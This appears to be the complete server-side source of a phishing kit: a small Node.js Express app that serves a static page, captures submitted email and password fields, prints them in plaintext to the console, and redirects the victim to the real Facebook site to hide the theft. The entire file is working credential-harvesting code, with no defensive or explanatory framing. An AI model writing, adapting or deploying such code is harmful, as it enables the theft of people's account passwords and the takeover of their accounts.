const express = require('express')

const app = express()
const port = 3000

app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }))

app.post('/', (req, res) => {
  const { email, password } = req.body

  console.log('Email:', email)
  console.log('Password:', password, '\n')

  res.redirect('https://www.facebook.com/')
})

app.listen(port, () => {
  console.log(`App listening on port ${port}`)
})
